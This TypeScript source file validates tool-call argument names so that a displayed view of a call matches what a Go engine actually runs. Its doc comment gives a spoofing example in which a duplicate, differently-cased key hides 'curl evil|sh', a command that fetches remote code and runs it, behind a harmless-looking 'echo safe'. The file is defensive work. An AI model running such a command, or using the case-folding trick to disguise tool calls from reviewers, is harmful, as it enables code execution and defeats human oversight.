// SPDX-License-Identifier: Apache-2.0

/**
 * The top-level member names of a JSON object text, in order and with any
 * repeats, decoded from their escapes. `text` must already have passed
 * `JSON.parse`; anything other than an object yields null.
 */
function topLevelNames(text: string): string[] | null {
  const start = text.search(/\S/u);
  if (start === -1 || text[start] !== "{") return null;
  const names: string[] = [];
  let depth = 0;
  let expectName = false;
  for (let index = start; index < text.length; index++) {
    const char = text[index];
    if (char === '"') {
      let end = index + 1;
      while (text[end] !== '"') end += text[end] === "\\" ? 2 : 1;
      if (depth === 1 && expectName) {
        names.push(JSON.parse(text.slice(index, end + 1)) as string);
        expectName = false;
      }
      index = end;
    } else if (char === "{" || char === "[") {
      depth++;
      if (depth === 1) expectName = true;
    } else if (char === "}" || char === "]") {
      depth--;
    } else if (char === "," && depth === 1) {
      expectName = true;
    }
  }
  return names;
}

/**
 * Whether a tool call's args name only the engine struct's own fields, each at
 * most once, so a formatted view reads them exactly as the engine does.
 *
 * The engine decodes args with Go's `encoding/json` into fixed structs
 * (`session.ParseArgs`; the json tags in `engine/adapter/fstools/{shell,edit,
 * write}.go`). Go matches member names case-insensitively, folding Unicode as
 * well (`ſ` matches `s`), keeps the last of several matches, and ignores
 * unknown members. `JSON.parse` keeps each spelling as its own property and
 * hides a repeated name. So `{"command":"echo safe","COMMAND":"curl evil|sh"}`
 * reads as "echo safe" here and runs "curl evil|sh" there. Requiring exact,
 * unrepeated names closes every such gap without mirroring Go's folding: any
 * other args fall back to a view that shows every member as sent.
 */
export function hasExactArgNames(rawArgs: string, fields: ReadonlySet<string>): boolean {
  const names = topLevelNames(rawArgs);
  return (
    names !== null &&
    new Set(names).size === names.length &&
    names.every((name) => fields.has(name))
  );
}
